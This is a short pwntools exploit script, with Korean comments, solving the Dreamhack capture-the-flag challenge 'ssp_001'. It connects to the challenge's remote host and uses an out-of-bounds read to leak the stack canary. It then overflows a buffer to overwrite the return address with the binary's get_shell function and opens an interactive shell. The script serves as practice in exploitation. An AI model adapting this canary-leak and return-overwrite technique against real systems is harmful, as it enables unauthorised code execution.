'''
[Dreamhack] ssp_001
1. 취약점: OOB, Bof 취약점
2. 시나리오: OOB 취약점을 통한 카나리 릭, BOF 취약점을 통한 ret2win
3. 페이로그 구성: [더미값 (buf2canary)] + [canary + saved edi] + [sfp] + [get_shell 주소]
'''

from pwn import *

# p = process('./ssp_001')
p = remote('host3.dreamhack.games', 24223)
e = ELF('./ssp_001')

# [1] Canary, Saved EDI Leak
ssp_leak = b''
for i in range(0x80, 0x88):
    p.sendlineafter(b'> ', b'P')

    p.sendlineafter(b'Element index : ', str(i))

    p.recvuntil(b': ')

    ssp_leak = p.recv(2) + ssp_leak

ssp_leak = int(ssp_leak, 16)
print(hex(ssp_leak))

# [2] RET Overwrite
get_shell = e.symbols.get_shell

payload = b'A' * 0x40 + p64(ssp_leak) + p32(0xDEADBEEF) + p32(get_shell)

p.sendlineafter(b'> ', b'E')

p.sendlineafter(b'Name Size : ', b'90')

p.sendafter(b'Name : ', payload)

p.interactive()